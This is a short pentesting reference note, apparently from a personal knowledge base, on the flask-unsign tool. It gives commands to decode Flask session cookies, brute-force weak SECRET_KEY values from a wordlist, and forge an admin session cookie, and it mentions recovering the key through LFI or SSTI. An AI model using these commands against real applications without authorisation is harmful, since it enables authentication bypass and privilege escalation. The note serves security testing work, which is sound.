# flask-unsign

**Tags:** `#flask-unsign` `#flask` `#session` `#cookie` `#SECRET_KEY` `#web`

Decodes, brute-forces, and **forges** Flask session cookies. Flask sessions are signed (with `SECRET_KEY`) but **not encrypted**, so anyone can read a cookie's contents, and anyone who recovers `SECRET_KEY` can mint arbitrary sessions — an instant authorization bypass when endpoints gate on session keys (`session['is_admin']`). flask-unsign decodes a cookie without the key, wordlist-brute-forces weak/default keys, and re-signs a chosen payload once the key is known.

**Source:** https://github.com/Paradoxis/Flask-Unsign
**Install:** `pipx install flask-unsign` (or `pip install flask-unsign`).

```bash
# Decode (no key needed)
flask-unsign --decode --cookie 'eyJ...'

# Brute-force a weak/default SECRET_KEY
flask-unsign --unsign --cookie 'eyJ...' --wordlist /usr/share/wordlists/flask-keys.txt

# Forge a session once you have the key (e.g. from config.py via LFI)
flask-unsign --sign --cookie "{'username':'admin','is_admin':True}" --secret '<SECRET_KEY>'
```

---

> [!note] **See also** — [[Services/Web Services/Flask|Flask]] — decode/brute/forge the signed session cookie for authz bypass once `SECRET_KEY` is recovered (config.py/LFI or `{{config}}` SSTI).

---

*Created: 2026-09-25*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
